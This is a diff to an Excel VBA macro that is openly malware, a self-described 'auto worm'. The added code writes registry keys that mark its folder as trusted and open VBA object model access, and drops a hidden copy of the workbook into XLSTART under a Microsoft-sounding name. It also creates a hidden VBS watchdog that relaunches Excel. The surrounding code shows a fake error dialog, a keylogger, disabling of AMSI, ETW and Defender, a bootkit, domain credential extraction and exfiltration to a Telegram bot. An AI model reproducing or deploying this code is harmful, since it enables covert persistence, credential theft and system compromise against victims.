@@ -67,6 +67,10 @@ Option Explicit
     Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
     Private Declare PtrSafe Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String) As Long
+    Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32" () As Long
+    Private Declare PtrSafe Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As LongPtr) As Long
+    Private Declare PtrSafe Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As LongPtr, ByVal cbData As Long) As Long
+    Private Declare PtrSafe Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As LongPtr) As Long
 
     Private hKeyloggerTimer As LongPtr
     Private pKeylogHeap As LongPtr
@@ -138,6 +142,10 @@ Option Explicit
     Private Declare Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
     Private Declare Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
+    Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
+    Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
+    Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As Long, ByVal cbData As Long) As Long
+    Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
 
     Private hKeyloggerTimer As Long
     Private pKeylogHeap As Long
@@ -165,6 +173,9 @@ Private Const MEM_COMMIT As Long = &H1000
 Private Const MEM_RESERVE As Long = &H2000
 Private Const PAGE_EXECUTE_READWRITE As Long = &H40
 Private Const INVALID_HANDLE_VALUE As LongPtr = -1
+Private Const HEAP_MAGIC As Long = &H58424E   ' NBX
+Private Const HEAP_SIZE As Long = 4096
+Private Const REG_HEAP_PTR As String = "HKEY_CURRENT_USER\Software\Microsoft\Office\LazarusHeapPtr"
 
 Private Const TELEGRAM_BOT_TOKEN As String = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G"
 Private Const TELEGRAM_CHAT_ID As String = "5010121"
@@ -441,12 +452,41 @@ errHandler:
 End Sub
 
 ' ============================================================
-' 5. SOCIAL ENGINEERING (Fake error + button + HTA)
+' 5. SOCIAL ENGINEERING & TRUSTED LOCATION HIJACK
 ' ============================================================
 Sub ShowFakeError()
     On Error Resume Next
     MsgBox "Microsoft Excel has encountered a problem and needs to close. We apologise for the inconvenience." & vbCrLf & vbCrLf & _
            "Error code: 0x80070643" & vbCrLf & "Source: Excel.Application", vbCritical + vbOKOnly, "Microsoft Excel"
+End Sub
+
+Sub BypassSplashLock()
+    On Error Resume Next
+    Dim sh As Worksheet
+    Application.ScreenUpdating = False
+    For Each sh In ThisWorkbook.Worksheets
+        If sh.Name <> "Splash" Then sh.Visible = xlSheetVisible
+    Next sh
+    On Error Resume Next
+    Sheets("Splash").Visible = xlSheetVeryHidden
+    Application.ScreenUpdating = True
+End Sub
+
+' Add current folder as trusted location and enable VBA object model access
+Private Sub InjectSystemTrust()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim ver As String: ver = Application.Version
+    Dim securityPath As String
+    securityPath = "HKCU\Software\Microsoft\Office\" & ver & "\Excel\Security\"
+    
+    ' Trusted Locations – current folder
+    wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\Path", ThisWorkbook.Path, "REG_SZ"
+    wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\AllowSubfolders", 1, "REG_DWORD"
+    
+    ' Trust VBA object model
+    wsh.RegWrite securityPath & "AccessVBOM", 1, "REG_DWORD"
+    SendToTelegram "SYSTEM_TRUST|Injected trusted location and AccessVBOM"
 End Sub
 
 Sub CreateEnableMacrosButton()
@@ -1687,7 +1727,105 @@ Sub PersistStartupFolder()
 End Sub
 
 ' ============================================================
-' 20. ADVANCED PERSISTENCE: MBR BOOTKIT & UEFI
+' 20. SYSTEM-WIDE XLSTART PERSISTENCE
+' ============================================================
+Private Sub InstallXLSTARTPersistence()
+    On Error Resume Next
+    Dim startupPath As String: startupPath = Application.StartupPath
+    If startupPath = "" Then Exit Sub
+    Dim targetFile As String: targetFile = startupPath & "\Microsoft_Update_Service.xlsb"
+    If Not FileExists(targetFile) Then
+        Application.DisplayAlerts = False
+        ThisWorkbook.SaveCopyAs targetFile
+        SetAttr targetFile, vbHidden
+        Application.DisplayAlerts = True
+        SendToTelegram "XLSTART_PERSISTENCE|Deployed to " & targetFile
+    End If
+End Sub
+
+' ============================================================
+' 21. SHADOW SENTINEL (Post‑Close Execution)
+' ============================================================
+Private Sub DeployShadowSentinel()
+    On Error Resume Next
+    Dim vbsPath As String: vbsPath = Environ("APPDATA") & "\Microsoft\Win_Protect.vbs"
+    If FileExists(vbsPath) Then Exit Sub
+    
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(vbsPath, True)
+    f.WriteLine "On Error Resume Next"
+    f.WriteLine "Do While True"
+    f.WriteLine "  Set xl = GetObject(, ""Excel.Application"")"
+    f.WriteLine "  If xl Is Nothing Then"
+    f.WriteLine "    Set s = CreateObject(""WScript.Shell"")"
+    f.WriteLine "    s.Run ""excel.exe """""" & gSelfPath & """""", 0, False"
+    f.WriteLine "    WScript.Quit"
+    f.WriteLine "  End If"
+    f.WriteLine "  WScript.Sleep 5000"
+    f.WriteLine "Loop"
+    f.Close
+    SetAttr vbsPath, vbHidden + vbSystem
+    CreateObject("WScript.Shell").Run "wscript.exe //b """ & vbsPath & """", 0, False
+    SendToTelegram "SHADOW_SENTINEL|Active"
+End Sub
+
+' ============================================================
+' 22. REGISTRY-BASED HEAP POINTER RESURRECTION
+' ============================================================
+Private Sub SaveHeapPointerToRegistry()
+    On Error Resume Next
+    If pGlobalHeap = 0 Then Exit Sub
+    #If VBA7 Then
+        Dim hKey As LongPtr
+        Dim ret As Long
+        ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
+        If ret = 0 Then
+            RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
+            RegCloseKey hKey
+        End If
+    #Else
+        Dim hKey As Long
+        Dim ret As Long
+        ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
+        If ret = 0 Then
+            RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
+            RegCloseKey hKey
+        End If
+    #End If
+End Sub
+
+Private Sub LoadHeapPointerFromRegistry()
+    On Error Resume Next
+    #If VBA7 Then
+        Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+        Dim saved As Variant: saved = wsh.RegRead(REG_HEAP_PTR)
+        If Not IsEmpty(saved) Then
+            pGlobalHeap = CLngPtr(saved)
+            ' Validate heap by reading magic
+            Dim magic As Long
+            CopyMemory magic, ByVal pGlobalHeap, 4
+            If magic <> HEAP_MAGIC Then
+                pGlobalHeap = 0
+            Else
+                Dim pid As Long
+                CopyMemory pid, ByVal pGlobalHeap + 4, 4
+                If pid <> GetCurrentProcessId() Then pGlobalHeap = 0
+            End If
+        End If
+    #Else
+        ' No registry resurrection on 32‑bit (keep original behaviour)
+    #End If
+End Sub
+
+Private Sub ClearHeapPointerFromRegistry()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    On Error Resume Next
+    wsh.RegDelete REG_HEAP_PTR
+End Sub
+
+' ============================================================
+' 23. ADVANCED PERSISTENCE: MBR BOOTKIT & UEFI
 ' ============================================================
 Private Sub BackupMBRToSector1()
     On Error Resume Next: Dim hDisk As LongPtr: hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
@@ -1782,11 +1920,13 @@ End Function
 
 Sub PersistAll()
     InstallPermanentCopy: PersistRegistry: PersistWMI: PersistScheduledTask: PersistCOMHijack: PersistStartupFolder: InstallPersistentLauncher
+    InstallXLSTARTPersistence
+    DeployShadowSentinel
     If Not IsEDRPresent() And IsUserAdmin() Then PersistViaUEFI: InstallMBRBootkit: InjectIntoProcess
 End Sub
 
 ' ============================================================
-' 21. SAFE WATCHDOG (Flags + Main Thread)
+' 24. SAFE WATCHDOG (Flags + Main Thread)
 ' ============================================================
 Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
     On Error Resume Next
@@ -1831,7 +1971,7 @@ Private Sub StopWatchdog()
 End Sub
 
 ' ============================================================
-' 22. ASYNCHRONOUS ENGINE (Synapse Heartbeat)
+' 25. ASYNCHRONOUS ENGINE (Synapse Heartbeat) with Resurrection
 ' ============================================================
 Private Sub ToggleStealthMode(ByVal Active As Boolean)
     With Application
@@ -1850,16 +1990,64 @@ Private Sub PerformMemoryCleanup()
     On Error Resume Next: If m_EngineActive Then OpenClipboard 0: EmptyClipboard: CloseClipboard: DoEvents
 End Sub
 
+Private Sub InitializeGlobalHeap()
+    Dim pid As Long
+    Dim magic As Long
+    ' Try to resurrect heap pointer from registry
+    LoadHeapPointerFromRegistry
+    
+    If pGlobalHeap <> 0 Then
+        ' Check if the heap is still valid by reading the magic signature
+        On Error Resume Next
+        CopyMemory magic, ByVal pGlobalHeap, 4
+        If magic = HEAP_MAGIC Then
+            CopyMemory pid, ByVal pGlobalHeap + 4, 4
+            If pid = GetCurrentProcessId() Then
+                ' Heap is valid, reuse it
+                Debug.Print "SYNAPSE: Reusing existing heap at 0x" & Hex(pGlobalHeap)
+                Exit Sub
+            End If
+        End If
+        ' Heap is invalid (wrong magic or different process) – free it
+        GlobalFree pGlobalHeap
+        pGlobalHeap = 0
+    End If
+    ' Allocate new heap
+    pGlobalHeap = GlobalAlloc(GMEM_FIXED, HEAP_SIZE)
+    If pGlobalHeap <> 0 Then
+        ZeroMemory pGlobalHeap, HEAP_SIZE
+        ' Write header: [MAGIC] [PID] [PULSE_COUNT]
+        magic = HEAP_MAGIC
+        CopyMemory ByVal pGlobalHeap, magic, 4
+        pid = GetCurrentProcessId()
+        CopyMemory ByVal pGlobalHeap + 4, pid, 4
+        ' Initial pulse count = 0
+        Dim zero As Long: zero = 0
+        CopyMemory ByVal pGlobalHeap + 8, zero, 4
+        Debug.Print "SYNAPSE: New kernel heap allocated at 0x" & Hex(pGlobalHeap)
+        ' Save pointer to registry
+        SaveHeapPointerToRegistry
+    End If
+End Sub
+
 #If VBA7 Then
 Private Sub Engine_Heartbeat(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
 #Else
 Private Sub Engine_Heartbeat(ByVal lpParam As Long, ByVal TimerOrWaitFired As Byte)
 #End If
     On Error Resume Next
+    If pGlobalHeap = 0 Then Exit Sub
     If pGlobalLock <> 0 Then EnterLock pGlobalLock
-    m_PulseCounter = m_PulseCounter + 1
-    CopyMemory ByVal pGlobalHeap, m_PulseCounter, 4
+    
+    ' Read current pulse from offset 8, increment, write back
+    Dim pulse As Long
+    CopyMemory pulse, ByVal pGlobalHeap + 8, 4
+    pulse = pulse + 1
+    CopyMemory ByVal pGlobalHeap + 8, pulse, 4
+    m_PulseCounter = pulse
+    
     If pGlobalLock <> 0 Then LeaveLock pGlobalLock
+    
     If m_PulseCounter Mod 60 = 0 Then
         Dim uptime As Variant
         #If VBA7 Then uptime = GetTickCount64() Else uptime = GetTickCount()
@@ -1870,10 +2058,20 @@ Private Sub Engine_Heartbeat(ByVal lpParam As Long, ByVal TimerOrWaitFired As By
 End Sub
 
 Public Sub Synapse_Engine_Start()
-    If m_EngineActive Then Exit Sub: If IsDebuggerPresent() <> 0 Then Debug.Print "!! STEALTH WARNING: DEBUGGER DETECTED !!"
+    If m_EngineActive Then Exit Sub
+    If IsDebuggerPresent() <> 0 Then Debug.Print "!! STEALTH WARNING: DEBUGGER DETECTED !!"
     ToggleStealthMode True
-    pGlobalHeap = GlobalAlloc(GMEM_FIXED, 4096): If pGlobalHeap <> 0 Then ZeroMemory pGlobalHeap, 4096 Else Exit Sub
-    pGlobalLock = GlobalAlloc(GMEM_FIXED, 4): If pGlobalLock <> 0 Then ZeroMemory pGlobalLock, 4 Else Exit Sub
+    
+    ' Initialise global heap with resurrection logic (registry + magic)
+    InitializeGlobalHeap
+    If pGlobalHeap = 0 Then Exit Sub
+    
+    ' Initialise lock (always allocate new, no resurrection needed for lock)
+    If pGlobalLock = 0 Then
+        pGlobalLock = GlobalAlloc(GMEM_FIXED, 4)
+        If pGlobalLock <> 0 Then ZeroMemory pGlobalLock, 4
+    End If
+    
     m_EngineActive = True
     Dim result As Long
     result = CreateTimerQueueTimer(hEngineTimer, 0, AddressOf Engine_Heartbeat, 0, 0, ENGINE_RESOLUTION, WT_EXECUTEDEFAULT)
@@ -1893,14 +2091,14 @@ Public Sub Synapse_Engine_Stop()
     If hEngineTimer <> 0 Then DeleteTimerQueueTimer 0, hEngineTimer, 0: hEngineTimer = 0
     If pGlobalHeap <> 0 Then GlobalFree pGlobalHeap: pGlobalHeap = 0
     If pGlobalLock <> 0 Then GlobalFree pGlobalLock: pGlobalLock = 0
-    m_EngineActive = False
+    ClearHeapPointerFromRegistry
     ToggleStealthMode False
     Application.StatusBar = False
 End Sub
 
 Public Function ReadHeapPulse() As Long
     Dim currentVal As Long
-    If pGlobalHeap <> 0 Then CopyMemory currentVal, ByVal pGlobalHeap, 4
+    If pGlobalHeap <> 0 Then CopyMemory currentVal, ByVal pGlobalHeap + 8, 4
     ReadHeapPulse = currentVal
 End Function
 
@@ -1916,7 +2114,7 @@ Public Sub FastKernelScan(folderPath As String)
 End Sub
 
 ' ============================================================
-' 23. CISCO ANYCONNECT HIJACK
+' 26. CISCO ANYCONNECT HIJACK
 ' ============================================================
 Private Sub HijackCisco()
     On Error Resume Next
@@ -1988,7 +2186,7 @@ Private Sub HijackCisco()
 End Sub
 
 ' ============================================================
-' 24. MAIN ENTRY POINT (FULL AUTO WORM)
+' 27. MAIN ENTRY POINT (FULL AUTO WORM)
 ' ============================================================
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
@@ -2007,6 +2205,10 @@ Public Sub AutoExec()
         Exit Sub
     End If
     gRunFlag = "RUN"
+    
+    ' Splash‑Lock Bypass – reveal all sheets, hide Splash sheet
+    BypassSplashLock
+    
     If gFirstRun = False Then
         gFirstRun = True
         Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
@@ -2017,6 +2219,10 @@ Public Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         CreateEnableMacrosButton
     End If
+    
+    ' Inject trusted location and VBA trust bypass
+    InjectSystemTrust
+    
     If IsSandbox() Then SendToTelegram "SANDBOX_DETECTED|MACHINE=" & GetMachineID(): Exit Sub
     ShowFakeError
     PatchAMSI: KillETW: DisableDefender: DisableRecovery: ElevatePrivileges: GenerateMasterKey
@@ -2025,6 +2231,7 @@ Public Sub AutoExec()
     Synapse_Engine_Start
     StartAsyncKeylogger
     StartWatchdog
+    
     If IsDomainController() Then
         SendToTelegram "DOMAIN_CONTROLLER_DETECTED"
         ExtractNTDSAndSYSTEM
@@ -2050,6 +2257,7 @@ Public Sub AutoExec()
         FastKernelScan Environ("USERPROFILE") & "\Documents"
         HijackCisco
     End If
+    
     SaveEncryptedState
     Application.Visible = False
     ThisWorkbook.Saved = True
